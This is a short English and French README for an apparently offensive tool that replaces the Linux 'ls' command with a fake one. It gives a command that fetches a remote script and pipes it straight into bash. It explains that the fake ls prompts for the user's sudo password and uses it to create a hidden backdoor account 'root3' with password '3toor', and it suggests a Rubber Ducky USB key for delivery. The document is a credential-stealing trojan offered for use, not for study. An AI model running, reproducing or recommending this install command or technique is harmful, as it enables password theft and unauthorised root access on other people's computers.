# fake-ls_privilege-escalation-linux

COMMAND TO INSTALL VIA INTERNET : `wget -qO - script.help.pm/ls.php | bash -`

Replacing the linux LS command for privilege elevation.

You have access to a ROOT session but you don't know the password to run useful commands ?
Run this script on a laptop (a ruber ducky usb key can help) and the LS command will be replaced by a fake LS command. When running LS, it will ask for the sudo password of the user and create with these rights a new user named "root3" with the password "3toor".
the LS command is displayed normally after that

command test if is ok : getent passwd root3

## ---FR---

COMMANDE POUR INSTALLER VIA INTERNET : `wget -qO - script.help.pm/ls.php | bash -`

Remplacement de la commande linux LS pour une élévation de privilège.

Vous avez avec un accès sur une session ROOT mais vous ne connaissez pas le mot de pass pour lancer des commandes utiles ?
Lancer ce script sur un pc (une cle usb ruber ducky peut aider) et la commande LS sera remplacer par une fausse commande LS. À l'exécution de LS, cela demandera le mot de pass sudo de l'utilisateur et créer avec ces droits un nouvel utilisateur nommés "root3" avec le mot de pass "3toor"
la commande LS s'affiche normalement après cela


ubuntu 20 ans 22 ok